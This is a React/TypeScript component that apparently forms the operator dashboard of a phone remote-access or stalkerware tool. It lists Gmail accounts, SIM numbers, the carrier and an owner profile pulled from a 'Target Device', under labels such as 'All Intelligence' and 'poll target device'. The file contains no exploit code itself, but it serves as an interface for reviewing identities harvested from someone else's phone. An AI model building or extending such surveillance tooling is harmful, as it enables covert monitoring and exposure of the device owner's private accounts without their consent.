"use client";

import React, { useState } from 'react';
import { 
    Mail, Phone, User, Copy, Check, RefreshCw, Smartphone, 
    ShieldCheck, Hash, AtSign, Radio, ExternalLink, CheckCircle2,
    MessageSquare, AlertCircle
} from 'lucide-react';

interface AccountsViewProps {
    device: any;
    onRefresh: () => void;
    isLoading?: boolean;
}

type AccountTab = 'all' | 'gmails' | 'sim' | 'owner';

export default function AccountsView({ device, onRefresh, isLoading }: AccountsViewProps) {
    const [copiedKey, setCopiedKey] = useState<string | null>(null);
    const [activeTab, setActiveTab] = useState<AccountTab>('all');

    const handleCopy = (text: string, key: string) => {
        if (!text) return;
        navigator.clipboard.writeText(text);
        setCopiedKey(key);
        setTimeout(() => setCopiedKey(null), 1800);
    };

    const gmails = device?.gmails && Array.isArray(device.gmails) && device.gmails.length > 0
        ? device.gmails
        : (device?.gmail ? [device.gmail] : []);

    const phoneNumbers = device?.phoneNumbers && Array.isArray(device.phoneNumbers) && device.phoneNumbers.length > 0
        ? device.phoneNumbers
        : (device?.phoneNumber ? [device.phoneNumber] : []);

    const carrier = device?.carrier || '';
    const ownerName = device?.ownerName || device?.name || 'Device Owner';
    const isOnline = Boolean(device?.online);
    const deviceName = device?.name || device?.model || 'Target Device';

    return (
        <div className="max-w-5xl mx-auto space-y-5 pb-16 px-1 sm:px-0">
            <header className="rounded-2xl bg-[#18191c] border border-white/[0.08] p-4 sm:p-6 shadow-sm">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                    <div className="flex items-center gap-3.5 min-w-0">
                        <div className="w-11 h-11 rounded-xl bg-white/[0.04] border border-white/[0.08] flex items-center justify-center shrink-0 text-zinc-300">
                            <Mail className="w-5 h-5" />
                        </div>
                        <div className="min-w-0">
                            <div className="flex items-center gap-2 flex-wrap">
                                <h1 className="text-base sm:text-lg font-semibold text-zinc-100 truncate tracking-tight">
                                    Accounts & Subscriptions
                                </h1>
                                <span className={`inline-flex items-center gap-1.5 px-2 py-0.5 rounded-md text-[11px] font-mono border ${
                                    isOnline 
                                        ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20' 
                                        : 'bg-zinc-800/60 text-zinc-400 border-zinc-700/40'
                                }`}>
                                    <span className={`w-1.5 h-1.5 rounded-full ${isOnline ? 'bg-emerald-400' : 'bg-zinc-500'}`} />
                                    {isOnline ? 'Active Sync' : 'Cached State'}
                                </span>
                            </div>
                            <p className="text-xs text-zinc-400 font-mono truncate mt-0.5">
                                Host: {deviceName} • {gmails.length} Google Accounts • {phoneNumbers.length} Mobile Lines
                            </p>
                        </div>
                    </div>

                    <div className="flex items-center gap-2 self-end sm:self-center shrink-0">
                        <button
                            onClick={onRefresh}
                            disabled={isLoading}
                            className="inline-flex items-center gap-2 px-3.5 py-2 rounded-xl bg-white/[0.06] hover:bg-white/[0.1] active:bg-white/[0.04] border border-white/[0.09] text-zinc-200 font-medium text-xs transition-colors disabled:opacity-40"
                        >
                            <RefreshCw className={`w-3.5 h-3.5 ${isLoading ? 'animate-spin' : ''}`} />
                            <span>Refresh Accounts</span>
                        </button>
                    </div>
                </div>

                <div className="grid grid-cols-3 gap-2.5 mt-5 pt-5 border-t border-white/[0.06]">
                    <div className="p-3 rounded-xl bg-white/[0.02] border border-white/[0.04]">
                        <span className="text-[11px] text-zinc-500 block mb-1">Google Accounts</span>
                        <div className="flex items-baseline gap-1.5">
                            <span className="text-lg font-semibold text-zinc-100 font-mono">{gmails.length}</span>
                            <span className="text-[11px] text-zinc-400">Synced</span>
                        </div>
                    </div>

                    <div className="p-3 rounded-xl bg-white/[0.02] border border-white/[0.04]">
                        <span className="text-[11px] text-zinc-500 block mb-1">Line Numbers</span>
                        <div className="flex items-baseline gap-1.5">
                            <span className="text-lg font-semibold text-zinc-100 font-mono">{phoneNumbers.length}</span>
                            <span className="text-[11px] text-zinc-400">Identities</span>
                        </div>
                    </div>

                    <div className="p-3 rounded-xl bg-white/[0.02] border border-white/[0.04]">
                        <span className="text-[11px] text-zinc-500 block mb-1">Carrier Network</span>
                        <div className="flex items-baseline gap-1.5">
                            <span className="text-sm sm:text-base font-semibold text-zinc-100 truncate font-mono">
                                {carrier || 'Cellular'}
                            </span>
                        </div>
                    </div>
                </div>
            </header>

            <div className="flex sm:hidden overflow-x-auto no-scrollbar gap-1.5 p-1 bg-[#18191c] rounded-xl border border-white/[0.06]">
                {(['all', 'gmails', 'sim', 'owner'] as AccountTab[]).map((tab) => {
                    const labels: Record<AccountTab, string> = {
                        all: 'All Intelligence',
                        gmails: `Gmails (${gmails.length})`,
                        sim: `SIM Numbers (${phoneNumbers.length})`,
                        owner: 'Owner Profile'
                    };
                    const isActive = activeTab === tab;
                    return (
                        <button
                            key={tab}
                            onClick={() => setActiveTab(tab)}
                            className={`px-3 py-1.5 rounded-lg text-xs font-medium whitespace-nowrap transition-colors ${
                                isActive 
                                    ? 'bg-white/10 text-zinc-100 border border-white/[0.08]' 
                                    : 'text-zinc-400 hover:text-zinc-200'
                            }`}
                        >
                            {labels[tab]}
                        </button>
                    );
                })}
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                <section className={`rounded-2xl bg-[#18191c] border border-white/[0.08] p-5 sm:p-6 space-y-4 ${
                    activeTab === 'all' || activeTab === 'gmails' ? 'block' : 'hidden sm:block'
                }`}>
                    <div className="flex items-center justify-between pb-3.5 border-b border-white/[0.06]">
                        <div className="flex items-center gap-2.5">
                            <AtSign className="w-4 h-4 text-zinc-300" />
                            <h2 className="text-sm font-semibold text-zinc-100">Google Accounts (Gmail)</h2>
                        </div>
                        <span className="text-[11px] font-mono text-zinc-400 bg-white/[0.04] px-2 py-0.5 rounded border border-white/[0.06]">
                            {gmails.length} Detected
                        </span>
                    </div>

                    <div className="space-y-2">
                        {gmails.length > 0 ? (
                            gmails.map((email: string, idx: number) => (
                                <div 
                                    key={idx}
                                    className="flex items-center justify-between p-3 rounded-xl bg-white/[0.02] hover:bg-white/[0.04] border border-white/[0.04] transition-colors gap-3"
                                >
                                    <div className="flex items-center gap-3 min-w-0">
                                        <div className="w-8 h-8 rounded-lg bg-white/[0.05] border border-white/[0.08] flex items-center justify-center font-mono text-xs font-semibold text-zinc-300 shrink-0">
                                            {email[0]?.toUpperCase() || 'G'}
                                        </div>
                                        <div className="min-w-0">
                                            <p className="font-mono text-xs sm:text-sm font-medium text-zinc-100 truncate">
                                                {email}
                                            </p>
                                            <span className="text-[10px] text-zinc-500 font-mono">
                                                {idx === 0 ? 'Primary Sync Identity' : 'Associated Account'}
                                            </span>
                                        </div>
                                    </div>

                                    <button
                                        onClick={() => handleCopy(email, `email_${idx}`)}
                                        className="h-8 w-8 rounded-lg bg-white/[0.04] hover:bg-white/[0.08] active:bg-white/[0.02] border border-white/[0.06] flex items-center justify-center text-zinc-400 hover:text-zinc-200 transition-colors shrink-0"
                                        title="Copy Account Email"
                                    >
                                        {copiedKey === `email_${idx}` ? (
                                            <Check className="w-3.5 h-3.5 text-emerald-400" />
                                        ) : (
                                            <Copy className="w-3.5 h-3.5" />
                                        )}
                                    </button>
                                </div>
                            ))
                        ) : (
                            <div className="py-10 text-center space-y-2">
                                <Mail className="w-6 h-6 text-zinc-600 mx-auto" />
                                <p className="text-xs text-zinc-400">No authenticated accounts retrieved.</p>
                                <p className="text-[11px] text-zinc-500">Tap Refresh Accounts above to poll target device.</p>
                            </div>
                        )}
                    </div>
                </section>

                <section className={`rounded-2xl bg-[#18191c] border border-white/[0.08] p-5 sm:p-6 space-y-4 ${
                    activeTab === 'all' || activeTab === 'sim' ? 'block' : 'hidden sm:block'
                }`}>
                    <div className="flex items-center justify-between pb-3.5 border-b border-white/[0.06]">
                        <div className="flex items-center gap-2.5">
                            <Phone className="w-4 h-4 text-zinc-300" />
                            <h2 className="text-sm font-semibold text-zinc-100">SIM & Line Identifiers</h2>
                        </div>
                        <div className="flex items-center gap-1.5">
                            {carrier && (
                                <span className="text-[11px] font-mono text-zinc-400 bg-white/[0.04] px-2 py-0.5 rounded border border-white/[0.06] truncate max-w-[120px]">
                                    {carrier}
                                </span>
                            )}
                            <span className="text-[11px] font-mono text-zinc-400 bg-white/[0.04] px-2 py-0.5 rounded border border-white/[0.06]">
                                {phoneNumbers.length}
                            </span>
                        </div>
                    </div>

                    <div className="space-y-2">
                        {phoneNumbers.length > 0 ? (
                            phoneNumbers.map((num: string, idx: number) => (
                                <div 
                                    key={idx}
                                    className="flex items-center justify-between p-3 rounded-xl bg-white/[0.02] hover:bg-white/[0.04] border border-white/[0.04] transition-colors gap-3"
                                >
                                    <div className="flex items-center gap-3 min-w-0">
                                        <div className="w-8 h-8 rounded-lg bg-white/[0.05] border border-white/[0.08] flex items-center justify-center font-mono text-xs font-semibold text-zinc-300 shrink-0">
                                            #{idx + 1}
                                        </div>
                                        <div className="min-w-0">
                                            <p className="font-mono text-xs sm:text-sm font-semibold text-zinc-100 truncate">
                                                {num}
                                            </p>
                                            <span className="text-[10px] text-zinc-500 font-mono">
                                                {carrier ? `${carrier} • Verified Line` : 'Active Line Identity'}
                                            </span>
                                        </div>
                                    </div>

                                    <button
                                        onClick={() => handleCopy(num, `phone_${idx}`)}
                                        className="h-8 w-8 rounded-lg bg-white/[0.04] hover:bg-white/[0.08] active:bg-white/[0.02] border border-white/[0.06] flex items-center justify-center text-zinc-400 hover:text-zinc-200 transition-colors shrink-0"
                                        title="Copy Phone Number"
                                    >
                                        {copiedKey === `phone_${idx}` ? (
                                            <Check className="w-3.5 h-3.5 text-emerald-400" />
                                        ) : (
                                            <Copy className="w-3.5 h-3.5" />
                                        )}
                                    </button>
                                </div>
                            ))
                        ) : (
                            <div className="py-10 text-center space-y-2">
                                <Phone className="w-6 h-6 text-zinc-600 mx-auto" />
                                <p className="text-xs text-zinc-400">
                                    {carrier ? `Carrier: ${carrier}` : 'No phone number stored on SIM card binary.'}
                                </p>
                                <p className="text-[11px] text-zinc-500">
                                    Numbers sync automatically once WhatsApp, Telegram, or Contacts are authorized.
                                </p>
                            </div>
                        )}
                    </div>
                </section>
            </div>

            <section className={`rounded-2xl bg-[#18191c] border border-white/[0.08] p-5 sm:p-6 ${
                activeTab === 'all' || activeTab === 'owner' ? 'block' : 'hidden sm:block'
            }`}>
                <div className="flex items-center justify-between pb-3.5 border-b border-white/[0.06] mb-4">
                    <div className="flex items-center gap-2.5">
                        <User className="w-4 h-4 text-zinc-300" />
                        <h2 className="text-sm font-semibold text-zinc-100">Host Device Owner Profile</h2>
                    </div>
                    <span className="inline-flex items-center gap-1 text-[11px] font-mono text-emerald-400">
                        <ShieldCheck className="w-3.5 h-3.5" /> Verified Profile
                    </span>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
                    <div className="p-3.5 rounded-xl bg-white/[0.02] border border-white/[0.04]">
                        <span className="text-[11px] text-zinc-500 block mb-0.5">Profile Display Name</span>
                        <p className="text-sm font-semibold text-zinc-100 truncate">{ownerName}</p>
                    </div>
                    <div className="p-3.5 rounded-xl bg-white/[0.02] border border-white/[0.04]">
                        <span className="text-[11px] text-zinc-500 block mb-0.5">Primary Communication Channel</span>
                        <p className="font-mono text-zinc-200 truncate">
                            {phoneNumbers[0] || gmails[0] || 'Awaiting Authorization'}
                        </p>
                    </div>
                    <div className="p-3.5 rounded-xl bg-white/[0.02] border border-white/[0.04]">
                        <span className="text-[11px] text-zinc-500 block mb-0.5">Host Hardware Model</span>
                        <p className="font-mono text-zinc-200 truncate">{deviceName}</p>
                    </div>
                </div>
            </section>
        </div>
    );
}
